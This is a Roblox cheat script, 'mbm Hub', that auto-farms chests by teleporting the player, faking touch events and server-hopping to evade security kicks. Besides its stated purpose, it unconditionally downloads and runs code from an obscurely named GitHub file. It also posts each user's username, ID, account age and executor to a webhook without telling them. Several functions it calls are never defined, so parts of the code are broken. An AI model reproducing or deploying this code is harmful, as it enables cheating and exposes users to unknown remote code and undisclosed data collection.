--[[

wdym

--]]
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
	Title = "mbm Hub",
	SubTitle = "https://dsc.gg/m1m",
	TabWidth = 155,
	Size = UDim2.fromOffset(450, 400),
	Acrylic = true,
	Theme = "Amethyst",
	MinimizeKey = Enum.KeyCode.LeftControl
})

---Close UI
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")


ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ScreenGui

ImageButton.Position = UDim2.new(0.10615778, 0, 0.16217947, 0)
ImageButton.Size = UDim2.new(0.0627121851, 0, 0.107579626, 0)
ImageButton.Image = "rbxassetid://16162667260"

UICorner.CornerRadius = UDim.new(0, 30)
UICorner.Parent = ImageButton


UIGradient.Parent = ImageButton

UIAspectRatioConstraint.Parent = ImageButton
UIAspectRatioConstraint.AspectRatio = 0.988

repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes");
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui");
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main");
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")

local Options = Fluent.Options

notify("ty for using")
notify("auto chest script mbm hub")

local onTabs = {
    Main = Window:AddTab({ Title = "Chest", Icon = "16149561122" }),
}

      onTabs.Main:AddButton({
        Title = "F9",
        Description = "Console roblox",
        Callback = function()
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.mcl then
                            game:GetService("VirtualInputManager"):SendKeyEvent("F9",game)
                        end
                    end)
                end
                end)  
        end
    })
onTabs.Main:AddParagraph({
    Title = "maybe",
    Content = "SCRIPT MADE BY m1M \n ty for using"
})
onTabs.Main:AddParagraph({
    Title = "https://dsc.gg/m1m",
    Content = "JOIN MY DISCORD SERVER"
})
onTabs.Main:AddParagraph({
    Title = "https://bio.site/m1m",
    Content = "MY bio"
})

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Pirates") 

spawn(function()
	while wait() do
	if _G.ChestBypass then
	pcall(function()
	for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
	  if string.find(v.Name, "Chest") then
		  print(v.Name)
		  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
		  wait(.15)
	  end
	end
	game.Players.LocalPlayer.Character.Head:Destroy()
	for _,v in pairs(game:GetService("Workspace"):GetDescendants()) do
	if string.find(v.Name, "Chest") and v:IsA("TouchTransmitter") then
	firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
	wait()
	firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
	end
	end
	end)
	end
	end
	end)
	
	spawn(function()
	while task.wait() do
	if _G.ChestBypass then
		local ohString1 = "SetTeam"
		local ohString2 = "Pirates"
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(ohString1, ohString2)
	 end
	end
	end)	

loadstring(game:HttpGet('https://raw.githubusercontent.com/palacetamon098/gwamrbswhpouf/main/tshpwqklytuirxfzvb'))()

           if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
                    local HttpService = game:GetService("HttpService")
                    local Data =
                        {
                            ["embeds"]= {
                               {

                                    ["fields"]= {

                                        {
                                            ["name"]= "Mirage island",
                                            ["value"]= "```found```",
                                            ["inline"]= true
                                        },
                                        {
                                            ["name"]= "join server",
                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
                                            ["inline"]= true
                                        },
                                    }              
                                }
                            }
                            }

                    local Headers = {["Content-Type"]="application/json"}
                    local Encoded = HttpService:JSONEncode(Data)

                    Request = http_request or request or HttpPost or syn.request
                    local Final1 = {Url = _G.M , Body = Encoded, Method = "POST", Headers = Headers}

                    Request(Final1)
           end
                if game.PlaceId == 7449423635 then 
                if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
                    local HttpService = game:GetService("HttpService")
                    local Data =
                        {
                            ["embeds"]= {
                               {

                                    ["fields"]= {

                                        {
                                            ["name"]= "moon : 3/4",
                                            ["value"]= "who want do trial?",
                                            ["inline"]= true
                                        },
                                        {
                                            ["name"]= "join server",
                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
                                            ["inline"]= true
                                        },
                                    }              
                                }
                            }
                            }

                    local Headers = {["Content-Type"]="application/json"}
                    local Encoded = HttpService:JSONEncode(Data)

                    Request = http_request or request or HttpPost or syn.request
                    local Final1 = {Url = _G.FM , Body = Encoded, Method = "POST", Headers = Headers}

                    Request(Final1)
                end
                end
                local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Trigon" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Fluxus" or
"Fluxus"
                    local HttpService = game:GetService("HttpService")
                     local Data =
                        {
                            ["embeds"]= {
                                {            
                                    ["title"]= "Profile";
                                    ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
                                    ["description"]= "```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..") ```";
                                    ["color"]= tonumber(cc00cc);
                                     ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1181972023539421204/1202094832580034651/K.png?ex=65cc350d&is=65b9c00d&hm=de633a27401a66cc752a46835f7b35d169ad90130bb1e39af62c5c21e9ae3458&"};
                                    
                                    ["fields"]= {
                                        {
                                            ["name"]= "excutor📑",
                                            ["value"]= "```"..ExecutorUsing.."```",
                                            ["inline"]= true
                                        },
                                        {
                                            ["name"]= "age🗓",
                                            ["value"]= "```"..game.Players.LocalPlayer.AccountAge.." Days```",
                                            ["inline"]= true
                                        },
                                        {
                                            ["name"]= "ty for using📜",
                                            ["value"]= "```Mbm Hub!!!```",
                                            ["inline"]= true
                                        },
                 
                                    }              
                                }
                            }
                    }
                    local Headers = {["Content-Type"]="application/json"}
                    local Encoded = HttpService:JSONEncode(Data)
                    
                    Request = http_request or request or HttpPost or syn.request
                    local Final = {Url = _G.U , Body = Encoded, Method = "POST", Headers = Headers}
                    Request(Final)
repeat wait() until game:IsLoaded()
aut = true

function totarget(CFgo)
    local tween_s = game:service"TweenService"
    local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - CFgo.Position).Magnitude/250, Enum.EasingStyle.Linear)
    local tween, err = pcall(function()
        tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = CFgo})
        tween:Play()
    end)
    if not tween then return err end
end


function thisCode()
    repeat task.wait() until game:IsLoaded()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    local File = pcall(function()
        AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
    end)
    if not File then
        table.insert(AllIDs, actualHour)
        writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
    end
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                delfile("NotSameServers.json")
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                end
            end
        end
    end
    
    function Teleport()
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
        end
    end
    local veryImportantWaitTime = 0.5
    task.spawn(function()
        while task.wait(veryImportantWaitTime) do
            pcall(function()
                for i,v in pairs(game.CoreGui:GetDescendants()) do
                    pcall(function()
                        if string.find(v.Name,"ErrorMessage") then
                            if string.find(v.Text,"Security kick") then
                                veryImportantWaitTime = 1e9
                                Teleport()
                            end
                        end
                    end)
                end
            end)
        end
    end)
    
aut = true
    
function auto()
    if aut == true then
    task.spawn(function()
        while aut == true do
            if aut == true then
                local hasChar = game.Players.LocalPlayer:FindFirstChild("Character")
                if not game.Players.LocalPlayer.Character then
        
                else
                    local hasCrewTag = game.Players.LocalPlayer.Character:FindFirstChild("CrewBBG",true)
                    if hasCrewTag then hasCrewTag:Destroy() end
                    local hasHumanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                    if hasHumanoid then
                        local Chest = game.Workspace:FindFirstChild("Chest4") or game.Workspace:FindFirstChild("Chest3") or game.Workspace:FindFirstChild("Chest2")
                        
                                                if Chest then
                            game.Players.LocalPlayer.Character:PivotTo(Chest:GetPivot())
                            firesignal(Chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        else
                        if game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice") then
         aut = false
                            Teleport()
                            break
                        end
                    end 
                end
            end
            end
            task.wait()
            end
    end)

end
end
end
thisCode()
auto()
task.spawn(function()
while wait() do
if game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness") then
         aut = false
end
end
end)

join = game.Players.localPlayer.Neutral == false
if _G.Team == nil then
    _G.Team = "Pirates"
end
_G.Team = "Marines"
if (_G.Team == "Pirates" or _G.Team == "Marines") and not join then
    repeat wait()
        pcall(function()
            join = game.Players.localPlayer.Neutral == false
            if _G.Team == "Pirates" then
                for i,v in pairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
                    for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton[v])) do
                        v.Function()
                    end
                end
            elseif _G.Team == "Marines" then
                for i,v in pairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
                    for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.ViewportFrame.TextButton[v])) do
                        v.Function()
                    end
                end
            else
                for i,v in pairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
                    for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.ViewportFrame.TextButton[v])) do
                        v.Function()
                    end
                end
            end
        end)
    until join == true
    game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Visible = false
end
--15582682098--mbm  x  Hub
print("made by minh hub")
print("mbm x hub")
print("join my discord server : https://dsc.gg/m1m-link")
print("bio : https://bio.site/m1m")
print("ty for using - have fun")
print("sk")
print("wait ,.,")
print("LCTSV - .,.")  

local Chest = onTabs.Main:AddToggle("Auto Chest", {Title = "Auto Chest Farm", Default = false })
Chest:OnChanged(function(toggled)
	if toggled then
		_G.ChestBypass = true
	else
		_G.ChestBypass = false
	end
end)

task.delay(3 * 60,function() -- hop every  min
   
    loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/hop/main/server/every"))()
       end)
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("Mbm")
SaveManager:SetFolder("auto chest")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
Window:SelectTab(1)
SaveManager:LoadAutoloadConfig()
